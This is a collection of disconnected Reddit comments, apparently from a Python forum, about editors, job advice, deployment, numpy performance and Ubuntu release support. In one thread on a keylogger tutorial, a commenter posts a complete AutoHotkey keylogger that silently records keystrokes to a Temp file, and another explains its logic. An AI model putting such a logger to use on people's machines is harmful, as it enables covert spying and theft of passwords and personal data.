Jesus, I thought python politics were reserved for the adult film industry 
Atom or Visual Studio Code.
IDLE or ArcGIS Model Builder export to python
You will not become a software developer with just knowledge of python or any language tbh. You have to think of being a developer like this: A car breaks down on the side of the road. It is towed to the repair shop you work at. You tell the boss "hey! Let me handle this one! I know how to use tools!" The boss says "that's great, but can you rebuild an engine?" Python is just a tool in a tool set of "languages" if you will. It is like a wrench, a wrench can get a lot of jobs done but it won't be the only tool you use. A wrench is also the wrong tool for a lot of jobs where another tool might be more effective and/or faster. What I am getting at is this, programming is a lot more than just knowing a language. Concepts like OOP, Layering, Algorithm choices, language choice, unit tests, Multi-threading, How best to use different data structures, and on, and on. This is just my opinion but if you know absolutely nothing about programming start with CS50x by Harvard. It is a free online course unless you want a cert of achievement. Then move up to the fundamentals of programming (links below). On the fundamentals of computer science class page there is a section (if you scroll down) that has the path you should take. The section is titled XSeries Program Details Follow that path and you will be rocking hard at a new job. https://www.edx.org/course/cs50s-introduction-computer-science-harvardx-cs50x https://www.edx.org/xseries/fundamentals-computer-science 
ew
What's also great about jupyter notebook is that you can work on a remote machine. Just make a ssh tunnel and you're good to go.
Finally a solid tutorial on making a keylogger with python
https://i.redd.it/fdsllmzr7xq01.png Dwarf Fortress summarizes combat, conversations, and etc like the picture above- I plan to extend that in my game.
VS code
Like in the previous 100+ questions which asked for exactly the same: There is no such thing as Python IDE. The "I" in IDE stands for "integrated". Python ins't integrated into PyCharm or VS Code or any other editor listed below. Examples of integrated environments are Smalltalk, DrScheme, Eclipse (for Java only). I use Emacs. After many years using it, projects like PyCharm look like a bad joke. So, you don't even consider switching. I also worked in automation department of a large programming company (mostly Java), but they had about 30 Python programmers (other automation people, testing etc.) where I was responsible for, well, automating work with code of the company. My impression so far is that people who choose to use something like PyCharm ore MSVS are the least competent users, who aren't motivated to learn how things work, and usually do the bare minimum required just not to get fired. It's not 100%, but I don't know, maybe 80% are like that. In many instances, these people wouldn't be able to accomplish basic tasks like: locate a file that belongs to the project in the file system, resolve rebase conflicts, find files containing a particular word. These would obviously be the people who required most hand-holding and those who reduced the productivity of everyone around them. They would also use their lack of knowledge of how their environment worked as an excuse for not doing any work, as in: "PyCharm wouldn't let me push my commit, so I didn't do it". Whatever your choice is, don't be like those people.
I think it's for the best that they didn't go with the "Community Governance Model"...
I don't think you could realistically be a software developer, also don't conflate IT with like software engineering. You could probably get a technical IT role but it will not be the easiest.
Other posters have a lot of good pointers. IT support is definitely easier to get in than developers. Honestly, you biggest problem is networking (please correct me if i'm wrong). I can call my friends and ex-colleagues and get interviews next couple of weeks (whether I'm a good fit or get hired is a different story). But at least I can get a shot at the job. Your current resume probably won't even pass the HR filter. Go for MS certification, go to networking events if possible. Add linux and AWS certificates. That should at least get you an interview.
wElL It wOrKs oN My lOcAl
Deploying software is anything but solved problem. You are simply delusional / not an expert in this field. C#, Java and Python are probably examples of the least used languages in the world, when it comes to distributing software to *users*, as opposed to installing it on company's servers by specially trained people. Some platforms made it almost necessary to use the languages above (eg. Android and Java), but they only were able to do that by creating a ton of extra infrastructure in their platform that helps with distribution. And that is why you have *some* Java presence on this arena. .NET is a similar story. Python is virtually non-existent on this arena. I can count on the fingers of one hand the desktop applications written in Python that are distributed to actual users. And virtually all of those had to write a lot of custom deployment and packaging code to get things to work at least somehow.
Stream windowing is such an interesting problem. How did you come up with the timings that you use? 
Thanks for the link, and didn't think you were defending them, sorry if I was rude. Just making the point on the irrelevancy of being part of an open source project
I really wish people would stop making videos and instead write an article linked to a github repo.
I first used PyCharm when I learned Python. Unfortunately, it doesn't run smoothly as it should on my machine. Anyway, now I use vim+plugins/tmux as my development environment. It's nice a combo, since I can use the same setup on RPis or on any server.
why would someone use this over gnu parallel
Thanks, I went down a rabbit hole trying to see if this bundle was worth it. Some previous reviews on this sub suggested that these are just "recycled shovelware" with very basic information
How will this affect the programmers?
Nice
what about a static site in this case ? If you do not have any use cases for a framework like login, dynamic data in a DB (DB connects, queries)... a static page (generated) is: * much easier(or free) to host (GitHub pages for example) * much more secure * simple to maintain * there a dozens of great static site generators in many languages out there Web Frameworks are great if your focus / use case is more on: * frequently changing data (for example users posting, commenting, voting,) which you store in a DB * Need some pre-made plugins (authentication, admin Gui ..) * but has some overheads: need server to host, is quite a lot of infrastructure (even if the framework hides it) lots of great python frameworks out there (no question) but if you need easy hosting and have not so much dynamic data ... Flask is great by the way ;) &amp;#x200B;
ed is the standard editor
That’s what we used in my computing course at uni. I used it to demo in the virtual machine but stuck with VSCode at home. It’s not too bad, at least it seems to be relatively complete.
One thing you might want to check out for inspiration is this Minecraft clone written in Pyglet: https://github.com/traverseda/pycraft
You can use it to generate braille text, but honestly there's probably already things to do this. 
I don't see why people have to conform to your ideals.
Line profilers break the JIT, you have to use statistical profilers like [vmprof](https://vmprof.readthedocs.io/en/latest/) which are better than line profilers anyway. We have been working on adding more support for [adjusting the garbage collector](https://bitbucket.org/pypy/extradoc/src/extradoc/blog/draft/2018-12-gc-disable/gc-disable.rst). The python debugger works as it does on CPython. But basically the idea behind PyPy is write it all in python without too much meta-coding, let the JIT do its thing. NumPy (and C-extensions in general) works via an emulation layer, so interop might be a bit slower, but definitely works. SciPy is running a CI job with PyPy. We have [ideas to make it fast](https://morepypy.blogspot.com/2018/09/inside-cpyext-why-emulating-cpython-c.html).
Because following an article with source code readily available to copy/paste is way easier to follow than listening to a video, pausing, typing something out, making a syntax error, going back, etc.
I prefer a video.
Pycharm Pro. It’s not slow on an i7 with an ssd and 16gig ram. Django/flask integration, database integration, docker integration is all great. 
Same. VS Code for most things, and Spyder for Python debugging / data science. I know VS Code has some Python debug add-ons, but I find it just familar to use Spyder.
It sounds like your nitpicking. It's a one minute video and it looks like the creator put effort into explaining it. I don't think the creator is obligated to write out an article because of trivial inconveniences, although a repo would have been nice. 
Vim + shell command line is our IDE.
dont pause, just type faster
It only grabs the audio so data usage is minimum in that regard but it does grab the highest quality audio it can.
As soon as I figure how to work github out I will
Thanks lol
I didn't either. I had to look it up at [PEP0263](https://www.python.org/dev/peps/pep-0263/). You can also set the fileencoding for your specific text editor: &amp;#x200B; #!/usr/bin/python # -\*- coding: &lt;encoding name&gt; -\*- or... #!/usr/bin/python # vim: set fileencoding=&lt;encoding name&gt; : 
Sorry, I am fairly new around here. What is the controversy with learnpython? 
On mobile - “An error occurred. Please try again later.”
I am all in favor of this. Especially beginner level projects. Some of you guys that can throw together some cool code in a matter of minutes that would take us new guys a few hours would be cool. Being able to dissect code that is at a beginner level is hugely helpful to learning for a lot of us newer people.
That's the first thing I ran across, and when I have something more substantial I'll gladly look into it deeper for tips and tricks but it's a bit overwhelming at a first glance.
Sounds like your onboarding processes and contributing guidelines could use some work.
don't type, just copy and paste
FWIW, all major python web frameworks are very similar in most ways, and mostly differ in the use-cases their documentation and community focuses on. For example, people always recommend Flask vs Django for small projects, but Django is fully capable of being used just like Flask...aka minimal configuration, single file deployability, etc. It's just that Django's documentation and community is about larger apps.
At the years of my study 2012-2015, we were taught Pascal. Somehow, by curriculum they weren't bothered to switch programming language
That last comment saved me 20 minutes today. Thanks! :D
Here is a direct link of the first video. You can find the full playlist in the description. https://youtu.be/9HCmuaertF8
Here is a direct link of the first video. You can find the full playlist in the description. https://youtu.be/9HCmuaertF8
Here is a direct link of the first video. You can find the full playlist in the description. https://youtu.be/9HCmuaertF8
Have you tried other IDE's?
Were you by chance using VS Code on Linux? In a recent update, they greatly improved VS Code's performance on Linux.
I can't comment about scipy, you probably want to use an fft (which allows you to view the amplitude of component frequencies) and look for spikes in amplitude. If you're using purely a click track, then use a low pass to get an envelope over the sound and then look for the sudden jumps from low values to high. You can take pair of points some small difference in time apart, and if the second one is much larger than the first, consider that as the start of the click. 
I finally finished my first useful project! My manager wanted this dashboard to display a bunch of metrics based on data in our database. It's a phenomenal waste of time unless it's automated, and I finally automated the data mining, cleanup, and storage with some Python scripting so I can load the data into an R Shiny app I developed. I feel like I have turned over a new leaf with being able to use different tools to solve a problem more efficiently.
Your submission has been automatically removed. Your reddit account must be older than 2 weeks before you can post. No exceptions. You can repost this when your account is old enough. This helps prevent spam. **If you need help with Python** see r/learnpython or r/learnprogramming. **WARNING** Reposting this under a different account before 2 weeks risks getting both accounts banned as well as domains in the post. *I am a bot, and this action was performed automatically. Please [contact the moderators of this subreddit](/message/compose/?to=/r/Python) if you have any questions or concerns.*
Come on, OP asked why ...
I have actually! I tried PyCharm for a while. Really didn’t like it. I also tried Visual Studio. Didn’t really care for it. So I just stuck with regular old IDLE for the past year
If this is a new system (as in all sides are new), in the majority of cases Python 3. Only if a large amount of libraries you are to be using are Py2 only would I say use Python 2.7, and use `six` to write Py3-compatible code as you go along and eventually port the libraries to Py3 along with your app. If an existing system (which is what this sounds like), write for both via `six`. EOL of Py2.7 means nothing in the enterprise world. I can guarantee you people will be writing Py2 code until at least 2030. The way that the core dev team handled the 2 to 3 switch, and the minor versions 3.0-3.3 and 3.5-3.7 (3.0-3.3 are considered beta-like, 3.5-3.7 have great backward compatibility but horrible forward-compatibility, especially with async stuff) will be a magnificent case study some years from now in the longevity of systems.
Yes! I appreciate that making a video is about a 100 times less work that writing an article though.
&gt; Deploying software is anything but solved problem. You are simply delusional / not an expert in this field And...you are? But then again as you mentioned in another thread you think the majority if not all users in this subreddit are idiots and "not real developers". Deploying Python software to users is a solved problem. Massive applications like Dropbox, Google Drive's client, and BitTorrent, are Python based and deployed just fine *years* ago. There are options that that give a one-command bundler for even the most complex of Python-developed software. &gt; I can count on the fingers of one hand the desktop applications written in Python that are distributed to actual users. And virtually all of those had to write a lot of custom deployment and packaging code to get things to work at least somehow. The number that you know of in wide use are unrelated to the ease in which it can be done. There are many more reasons than deployment to pick a language other than Python. And the custom deplpyment code part is just plain false. The ones I mentioned use tools such as cxfreeze, pyinstaller, or the now mostly unmaintained py2exe.
Is 18.04 aliasing "python" to 3.6.5 or "python3"? In most debian esque systems "python" still aliases to 2.7.X.
So here is the scoop. It is almost impossible choosing whats "better" in any case you could imagine, it really depends on what you want. Python has certain modules that facilitate game making (e.g. pyglet og PyGame), however game development done primarly in Python is largely unheard of in the industry (afaik) C# (and JS) is the main language used by the Unity framework, a huge and well-developed game engine that sees tons of use in both hobby and professional studios. For both regular software engineering and game dev, programming still applies. So learning programming before you think about gamedev might be a direction you could go in, and here i would recommend python for its simplicity. If you want to skip ahead, i would almost recommend things like GameMaker at first, and then transition into C# / JS and Unity So should you learn Python or C#? i don't know, but try both out! write a pong game with both, see what you like best.
Oh okay! This makes a lot of sense for me! Thank you for your help! :) I'll try what you said! Useful info! :)
python3, python is still linked to 2.7.15 for legacy reason. Though most (all) system applications refer to python3 and 18.94 is going to be around for next 9 years. 
I disagree. Communicating with an article is simple, takes arguably less time, and requires fewer specialty resources (video editing software, recording equipment)
it's ten 1-3 minute videos
Spoon feeder. Begone, thot
we'd love to explain! can you expand a bit on which particular timings interest you?
The same reason why we have PEP8. 
Damn... I really crave the respect of those who judge others so strongly based on what IDE they use. :( Fuck um.
Why are we teaching beginner programmers how to make a program that is mostly for malicious purposes?
Working a lot on PythonOnWheels in the last days... A Ruby on rails inspired web framework for python... [pythononwheels.org](https://www.pythononwheels.org)
It's a pretty cool way to learn file handling.
Why not? Could lead to a career in penetration testing. Maybe I speak from experience and I have a white hat on now. 
Could. More likely to be used to spy on people or steal credit card information though. Let them learn to program first then write pentesting tools.
See also the much, MUCH less complex project it was derived from: https://github.com/fogleman/Minecraft
I prefer to learn by vid. But i like my reps linked and available as well. 
Thank you so much for this suggestion. This was actually really helpful. It seems like when I hit Login, it just reloads the page. Rather annoying. I added some more logging and it seems that my custom View class is loaded, but the methods in the class do not override the defaults. So when I hit login, the custom login method is not called, the default is. That's really annoying. I'm not sure why this is happening, nor do I know how to fix it at this point. Don't know if you can think of something from the code provided. I'll take a look at it again tomorrow, my brain feels like porridge at this point.
ill give it a try
ill check out kodi and if it doesnt do what i want, ill check out a webapp. 
And you really think that VIM is the proper choice for coding beginner ? 
18.04's EOL is 2021. Are you thinking of 18.10 (not listed as LTS and codename Cosmic Cuttlefish)?
Trying to figure out my issue with going between loops, I can go from loop 1 to any loop and from loop 2 to any loop but if I try to go from loop 3 to loop 2 it just sends me to loop 1...... main_loop = True while main_loop: room_1 = False room_2 = False room_3 = False question1 = input('do you go in?') while room_1: prompt = input("You are standing in room 1. What room do you want to go to? '1', '2', or '3'?: ") if prompt == '1': print('you are standing in room 1') elif prompt == '2': print('you you head to room 2') room_1 = False room_2 = True elif prompt == '3': print('you you head to room 3') room_1 = False room_3 = True while room_2: prompt = input("You are standing in room 2. What room do you want to go to? '1', '2', or '3'?: ") if prompt == '1': print('you head to room 1') room_2 = False room_1 = True elif prompt == '2': print('you are standing in room 2') elif prompt == '3': print('you you head to room 3') room_2 = False room_3 = True while room_3: prompt = input("you are standing in room 3. What room do you want to go to? '1', '2', or '3'?: ") if prompt == '1': print('you head to room 1') room_3 = False room_1 = True elif prompt == '2': print('you you head to room 2') room_3 = False room_2 = True elif prompt == '3': print('you are standing in room 3')
If all you do is copy and paste then you aren’t learning. Watching a video requires you to translate what you are seeing on screen into actual code. Everyone learns slightly differently but it’s a fact that repetition and actually writing each line helps you learn faster and with better retention. 
Never knew about that. Will certainly take into consideration.
&gt;change things like &gt; &gt;if rich is True: &gt; &gt;to: &gt; &gt;if rich: If I were to do that, this would happen: rich = "foo" if rich: print("Rich is True") &gt;&gt;&gt; Rich is True. In other words, `if rich:` just checks if the variable exists, not if it is `True`. ``` and why are things like this # Create new empty list inputlist = [] or # If times is 1 if times == 1: commented? ``` That's why I'm asking for community input so I can fix these such issues.
This! Django, DB integration is amazing, plus I love the Science View when I am using pandas. 
People giving advice for IT have a few good suggestions, but I’m going disagree on the negative outlook for you becoming a developer. First of all, fuck that 37 yo “old age” stuff. The only people who actually think like that are people too young to know any better or companies who expect you to give your life for your job. Some of the best people I’ve worked with had degrees in completely unrelated fields (like journalism) and were in their mid 50’s. That said...Do your reading (there are courses on EdX and Coursera that can fill in the algorithm knowledge gaps), make demo projects and build a portfolio, then start applying to junior jobs. It’s harder not having a degree, but it’s not impossible. Straight up, plenty new grads are shit developers.
Working on an app that downloads media from any of the groupme chats you're in, and uploads them to google photos. &amp;#x200B; [https://github.com/khalifaali/groupMeToGooglePhotos](https://github.com/khalifaali/groupMeToGooglePhotos)
Why not? I overcame vim's notoriously steep learning curve in about two weeks thanks to a 20 minute youtube video. Learning vim early will leave OP with a superb advantage and work efficiency off the charts.
During the past couple of weeks I have been learning about deep neural networks and keras for python. I have no idea what I'm going to use it for but I'm excited to learn it and find it quite enjoyable. I also just discovered kaggle, so now I feel like a kid in a candy store
What application is he using?
Sounds like you just have crappy engineers my friend. I use PyCharm, but it's because it makes my life easier, and I am a visual person. But hey, good on you for using Emacs.
We can help you with that by creating some pull requests, which is a bit more advanced but github has some good builtin instruction from tue web interface on how to handle those !!!
&gt; And you really think that VIM is the proper choice for coding beginner ? Depends on the beginner. If Vim can become a barrier to entry, I'd still recommend an easier to use programmer's editor instead of an IDE - something responsive, not the kind with an integrated web browser engine.
Vim + tmux, jupyter sometimes for debugging/prototyping
Age and lack of degree in itself shouldn't be an issue. I got my first developer role at 37. My degree (+masters, PhD) are in medical sciences. My only relevant qualification would be a Computing A-Level from college at 18. So we're not so far apart on the things you're concerned about. The real issue I think is that you're just starting this now (I never stopped programming, even if it was mostly as a hobby). Despite what others have said I still don't think you're too late, but you may be underestimating the amount of work needed to get to employable developer level. If you do definitely want go this route, I'd suggest you focus early (e.g. with Python) on web backend Flask/Django) as it is marketable and relatively non-specialist. I would expect that to take a couple of years study at a minimum though. Why do you want to get into dev/IT?
Thanks! That’s very insightful 
I wouldn't say closures and functions are more similar to my namespace proposal than classes. Closures and functions don't expose their scope as a namespace. Classes and objects do. And the idea of lexical scopping is that bindings depend on the definition context. If a function is defined in the context of a class, it would be natural for the class to create a scope, and for variable references in functions defined in that scope to also be resolved in that scope. What you linked doesn't actually address that. The usage of self is a different issue.
We were using python 2 but recently have ported all of our SDKs and APIs to python 3
How is this even fully malicious? This tutorial doesn’t even cover packaging the keylogger into an executable like .exe or other disguising method for distribution. Not to mention, the “victim” would need python installed on their machine for it to execute. I thought this tutorial was awesome for a beginner like myself. It’s short and still manages to cover good topics like file handling. I learned some stuff, thanks OP!
I didn't say "fully malicious."
Solid mix of TMUX and VIm
You know what I meant. Like I said this tutorial doesn’t even cover packaging and distribution if it was going to be used in a malicious way. It’s really just a tool more than anything in the current state. 
Neither. Unlikely that those languages shine for that purpose. I think C still rules that world. But if you want to choose. Pick Python (IMO). 
Looking at the comments... I wonder if pyinstaller really needs its own website. I think the github page is good enough.
Back at it! Very well done once again. Keep it up brotha!
&gt; It's a one minute video lol you clearly didn't watch it
why is he getting downvoted?
Whats up with the tired looking and sweating Tom Hanks image?
Pretty much just a few lines of code in AutoHotkey: SetTimer, SaveLog, 1000 endkeys := "{LControl}{RControl}{LAlt}{RAlt}{LShift}{RShift}{LWin}{RWin}" . "{AppsKey}{F1}{F2}{F3}{F4}{F5}{F6}{F7}{F8}{F9}{F10}{F11}{F12}" . "{Left}{Right}{Up}{Down}{Home}{End}{PgUp}{PgDn}{Del}{Ins}{BS}" . "{CapsLock}{NumLock}{PrintScreen}{Pause}{Enter}" key := "" loop { Input, key, V L1, % endkeys e := ErrorLevel if (e ~= "i)EndKey:") logs .= "{" StrSplit(e, ":").2 "}" else if (key) logs .= key, key := "" } SaveLog: If (A_TimeIdlePhysical &gt; (1000 * 30) &amp;&amp; logs) { FileAppend, %logs%, %A_Temp%\logs.txt logs := "" } Return It's a simple exercise for most programmers to code up something like this. Not all Loggers are used for malicious intent.
Didn't say all are, but that is what most of them are for. Also, glad to see AHK is still popular.
pywinauto takes a while to learn, but once you get used to it, you can automate anything on windows, without precision mouse clicks like pyautogui. Pyautogui developer has said many times that he is looking for better ways to access windows/mac/linux gui but nothing so far, so he is probably going to implement easier way than pywinauto just for windows. Cross platform Gui access is near impossible
One of the best way to teach beginners actually. They like to do malicious things with computers.
eDiT - ShOuLd ReDiReCt yOu tO tHe pLaYlIsT wHeRe ClIcK
The coding line just changes the encoding used to parse the source file. It doesn't have any effect on opening files from within code. 
Couldn't agree more. Automation is one of the toughest subjects.
I assume it might be too much to say this.
That's pretty cool. I find that code much harder to read than Python though. I understand the endkeys block, but the loop and savelog I'm lost. lol I agree though, this was a great exercise to learn from. It has helped me understand some concepts in Python.
Don't copy and paste, just git clone.
Don't clone, just screenshot the video and OCR the source
Condolences. 
Ye my bad, I only saw the first 30 seconds
What type of games? For simple 2d games, Python's fine. C# is the language of Unity, which is great if you'd like to use that engine. For anything else, use C/++ or Rust.
AutoHotkey is Strange Language, but it's not to hard to get a grasp of it if you learn a few simple rules. I'll not go into all the details but I'll give an overview. Coming from Python, you'll need to understand that AHK handles Types for you, Commands vs Functions vs Subroutines, and Expression mode vs Command mode. All of this is the docs of course. The main Loop never ends, in Python this is the equivalent to While True. It contains the Command Input which has many options, I've set it up to terminate on every Keypress, and append normal keys and Speacial keys to variable Logs. SaveLog is a Subroutine, like a function but it's in Global scope meaning you don't pass in or return data, and you can access all objects/variables in this scope. SetTimer is calling the SaveLog subroutine every second and the If statement is checking that sytem has been idle for 30 seconds, using a built in Vaiable A_TimeIdlePhysical, And if the Logs variable contains data. If both conditions are True, using the Command FileAppend, it Appends the current Logs to the end of a file called Logs.txt that is stored in users Temp folder, A_Temp is a built in variable that stores this address and is used to point to our file.
A very robust and realistic example. 
Your submission has been automatically removed. Your reddit account must be older than 2 weeks before you can post. No exceptions. You can repost this when your account is old enough. This helps prevent spam. **If you need help with Python** see r/learnpython or r/learnprogramming. **WARNING** Reposting this under a different account before 2 weeks risks getting both accounts banned as well as domains in the post. *I am a bot, and this action was performed automatically. Please [contact the moderators of this subreddit](/message/compose/?to=/r/Python) if you have any questions or concerns.*
Not really an IDE, but I used Sublime for years. I installed and tried PyCharm at least once a year but somehow never really got to like it. For some reason, the UI didn't click with me and it also felt a bit sluggish compared to Sublime. A few months ago I installed Virtual Studio Code, and have been using it ever since. It basically has everything I need and is fast and lean at the same time.
This is a petty thing but why do people post pictures of themselves when announcing things they've made. Kind of a pet peeve of mine.
I love python to death, but here's the thing. Your right. Python would be super easy to learn compared to most languages. But that's the problem. What makes python quick and easy in the beginning makes it a slow and inefficient for game development. Python is an interpreted language and requires very little specification when it comes to variables, classes, memory, etc. Because of this the interpreter has to pick up the load and define, handle, and declare everything for you in real time. C# is a compiled language and requires in depth specification. declaring variables before you use them, defining the class type, memory management, etc. This is important for games because you need to run a multitude of functions at 60 frames a second. With all that in mind, Python would be a great introduction to programming. its quick and easy and requires way less code for a finished product. This makes it way easier to stay into in the beginning and would make getting into C# easier. However it would obviously take more time and hey, if you've got the moxie id say go straight into C#. 
:D (I wrote a bunch of stuff, but it all comes out really sappy and yet also not sappy enough to convey how much I appreciate and am grateful that people find my work happy. So I erased it and just posted the happy smiley face instead.)
You are the man Al! I feel honored and thankful your book has changed my life and allow me and others to be be confident in python programming!
So for JavaScript, once you know the basics but really want to know the specifics and best practices of how to learn and use JavaScript (as opposed to programming in general), the book to read is JavaScript: The Good Parts. Fluent Python is the analog for Python. Once you know loops and classes and a bit of the standard library, it is *the* book to read to get a thorough, advanced understanding of Python. I'd say once you've read one or two beginners books, and maybe thumbed through the Python Cookbook book or Python Module of the Week blog, then you can go through Fluent Python. If you want something that's in the similar vein of Fluent Python but shorter, Effective Python is great too. You really learn the particulars of the Python language with those books.
:D
:D
Yes, Automate is written for people with no previous programming experience. Fluent Python is for people who have read a couple Python books and have a bit of code writing experience, but it's by no means for advanced experts only. Automate was written to include readers who don't necessarily want to become software engineers, but are office workers who use computers every day and want to get more out of them.
:D
Going to start working on a text based company simulator.
Pycharm Professional. Jetbrains IDE is the best.
Oh, thank goodness I'm not the only one!
 for source_file in list_of_source_files: ....communicate(commands.replace("lol.cpp", source_file))
Pay me after I finish the work for you.
Nope, ubuntu (vanilla) LTS's are usually supported for 5 years, but 18.04 for was announced to be an extra long LTS and will be supported for 10 years. [sauce](https://itsfoss.com/ubuntu-18-04-ten-year-support/)
She's huge star wars fan so it works! &amp;#x200B;
Pyinstaller is the best— I freggin love it. I’m collecting all my best practices around it (I mod the spec file sometimes to add other libraries and what not that’s needed). I’m working to create a simple call to home/update scenario as well with my apps in the wild. 
Noob here but I used youtube to help me understand bs4
Vscode
^ Found the galaxy brain
With respect I trust [official sauces](https://www.ubuntu.com/about/release-cycle) that list the EOL at 2023 rather than this bumbling fool of an author who's spouting about IoT 4 years too late.
https://www.google.com/search?hl=en&amp;q=ubuntu%2018.04%2010%20years The source is the CEO of Canonical himself in a keynote in the last ubuntu conference. 
Your submission has been automatically removed. Your reddit account must be older than 2 weeks before you can post. No exceptions. You can repost this when your account is old enough. This helps prevent spam. **If you need help with Python** see r/learnpython or r/learnprogramming. **WARNING** Reposting this under a different account before 2 weeks risks getting both accounts banned as well as domains in the post. *I am a bot, and this action was performed automatically. Please [contact the moderators of this subreddit](/message/compose/?to=/r/Python) if you have any questions or concerns.*
Looks good. I would consider adding return types since you went to the trouble of typing the function arguments. I never realized how useful the return tires were until I went hunting to see what to expect from each function. It's a small change but it really does help the readability. 
I'm not shooting you, but if that's really the case it should be reflected on official print media as well. It has not been yet. Until that changes, even what the CEO says holds no water. Musk said he was going to go private when the stock price hit some mark. Not only did that not happen, Musk defrauded investors.
Commenting because I’m Interested in the answer
&gt;If all you do is copy and paste then you aren’t learning. If that's all you do, yes. &gt; Watching a video requires you to translate what you are seeing on screen into actual code. Which is tedious up to the point where things you don't know are presented. &gt;Everyone learns slightly differently but it’s a fact that repetition and actually writing each line helps you learn faster and with better retention. And reding is shown to be better for understanding and retention than video. Written instructions are often much faster and better teaching tools. Neither is always the most efficient method, but I don't think video is the best here.
If you search here and /r/learnpython you'll find some discussions, but the general sentement is that the books are of relative poor quality (as often is the case with Pact books) 
This happens because when you call this in numpy, it in turn passes the processing off to a C function, which will probably use BLAS, (possibly) making it faster than a simple for loop in C, and definitely faster than a for loop in Python.
I'm not, but what's the advice? It might apply to my situation as well.
I did a quick search here. Didn't think about r/learnpython. Thanks for your input. 
I think numpy keeps all the values in its array in the same region in memory, with some minimal metadata, so modifying all values in that array takes very little effort. Python lists can contain anything, so each multiply operation in the list comprehension requires a lookup to that item’s __mul__ method, if it has one, check that it can be multiplied by what you gave it, and on top of that, each item may be in a very different reaction in memory, so there are lots of searches that have to happen. 
I'm doing data viz and machine learning, which require some playing around on my side. I see notebooks as a good tool in such context.
I’d be down. NY location. 
ffffhhhhhh
gggggggggggghh
fffff
numpy use C code for the calculation which is faster in that sort of task. and if you write same thing in python code it will run on python
Just making sure, you know it's spelled braille right? In addition, it might be nice to add dot combinations e.g. a=1, b=12, etc for reference. There's liblouis on github, not coded in python but provides extensive tables for more info.
Some of the overhead in Python is type checking. Since there's no guarantee that every element of `d` is the same type of object, the logic for "what types are we looking at and how do we multiply them?" has to run separately for each element. Since NumPy arrays force all of the numbers in the array to be of the same type, NumPy can do that "deciding what to call" effort *once* before entering the loop..
Because numpy's internal implementation of that operation is native code. Python's is bytecode running in a relatively slow interpreter. Numpy's version of the loop that does most of the work is something like load a number from the old array multiply it by A store that number in the new array repeat Python's is more like load the next instruction see that it's a "multiply" load the next value of the old array check its type - it's an int load the value "A" check its type - it's an int look up the function used for multiplying together two ints run that function take the numeric value out of "i" take the numeric value out of "A" add those two values together create a new int object, store that result as its value take the object given by ^^^ and store it in the new array repeat
BTW if you just want to embed unicode characters by their name in string literals, there's very little reason to use a 3rd party emoji library to do it. Just do `"\N{HATCHING CHICK}"`.
I had the first and really is very good.
It really depends on the website you're crawling. Some websites are not so robots friendly and you will need to use different tools to parse thr html content. Javascript intensive websites are a big pain, and for this reason I'd suggest you use Selenium, BesutifulSoup and Chrome Webdriver. It's very simple and the docs are really good. Check out my robot I created to automate an RPG game online at https://github.com/j-000/dtmbot you can get an idea of how to work with Selenium. There are a few other libraries that do web crawling like Scrapy. This might be something to consider as well but rest assured that Selenium will be more than enough 😁 If you need any guidance to start, ping me a message and I'll help you. 
Ok I‘m thinking about doing like a remote team, because it’s pretty difficult to find people @ my location Can you give some form of contact
I've been writing python code for close to 20 years, but I also write in several other languages, e.g. Go, C, C#, SQL, Lua, makefile. I always seem to end up using a full featured multi-file text editor that can group files into projects, and do some decent syntax highlighting and auto-indenting. Geany has been my stand-in for a Python IDE for several years. Previously, I've used TextEdit, UltraEdit, Notepad++, among others. I am currently trying out Pycharm and Wing, again, each for the second or third time. I've tried Idle and Eric a time or two. Also IDEs like VScode, Eclipse, Idea and others, and editors like sublime, emacs, VIM, VI, etc.. None of the IDEs add enough value over a good editor, and none of the editors add enough to make me switch. I need an editor that works well with touch typing, that doesn't get in the way of writing and editing code. I don't mind running my code and debugging (if necessary) in a separate console window. Nor do I need help "understanding" my code. 
If you were in the federal government, I would put you in touch with someone who could pull strings to get software approved, or get you a standalone workstation you could install whatever you wanted on.
OMG...I misspelled it all this time. 🤣
Fellow aerospace engineer python enthusiast here! Awesome post! Did you work in aerospace? On what?
Partly it's because a Python for loop is interpreted, using byte-compiled code, not machine code. Another reason is because, for each iteration of the loop, Python has to lookup and call the \_\_iter\_\_ or \_\_getitem\_\_ method, and then call it. The lookups may involve a dictionary lookup; some of this has changed over the years, but there is still at least a descriptor lookup, and then a method call involved. So that's additional per-item overhead. When it's time to multiply, Python has to lookup the multiplication method for one or possibly both objects being multiplied, and again call that method for each iteration of the loop. Finally storing the result involves more lookup for the result list subscripting method, possible list appends as the list comprehension result grows in size (though maybe it's pre-allocated in Python based on size of d, I'm not sure). &amp;#x200B; Basically, Python doesn't support scalar multiplication for it's lists, so it can only do per-element operations, interpreted, instead. Numpy does understand how to do a scalar multiply for each element in an array, and it's implemented in compiled code (C, Fortran, etc.) and doesn't have to worry about the per-element Python object lookups. &amp;#x200B; Still it might be interesting to also compare w/ PyPy. First let's see the result for a numpy array mult of 10 million elements, and constructing a python list in a comprehension: $ python3 -m timeit '[x*2 for x in list(range(10**7))]' 1 loop, best of 5: 1.05 sec per loop $ python3 -m timeit -s 'import numpy as np' '2*np.arange(10**7)' 10 loops, best of 5: 22 msec per loop Numpy is about 45 times faster. But Python is being forced to construct two large lists, when it could make do with 1: $ python3 -m timeit '[x*2 for x in range(10**7)]' 1 loop, best of 5: 803 msec per loop So about a 20% improvement by not converting range to a list in the comprehension (I ran these a few times). &amp;#x200B; What about PyPy loops? $ pypy3 -m perf timeit '[x*2 for x in range(10**7)]' Mean +- std dev: 403 ms +- 21 ms So about an additional 2X speedup w/ PyPy for this loop, but still only about 5% the speed of Numpy. Was hoping for a bit better, honestly. But it shows how Python's looping isn't really designed for performance, and how vectorized operations for homogenous data types is hard to beat for speed.
Wow, your posts are amazing. Here's an example for others: https://www.reddit.com/r/AskEngineers/comments/aadifw/how_do_i_get_into_a_career_as_an_fea_analyst/ecs7k11/
I was looking forward to build a web application to convert English to Braille. 
Thank you for sharing your knowledge.
When you create an array with NumPy it creates a contiguous memory block (buzzword alert) with all elements being the same type (except when it is dtype=object but then you lose most of the speed anyways). So if you operate on them, you can basically go through them with the guarantee that all items are of the same type and they are mostly close to each other in the memory hence I can carry back and forth the entries of an array much cheaper instead of chasing the list entries in the memory.
Yeah, we have engineers just like you... visual persons, persons who like to skip work early to watch football, persons who'd rather send an opaque email and argue with others the like of them in a different department than have the problem fixed. Usually, this is because they don't know what they are doing and don't care to know.
Direct link to the paper: [http://aclweb.org/anthology/C18-1139](http://aclweb.org/anthology/C18-1139) It was a good read...thanks!
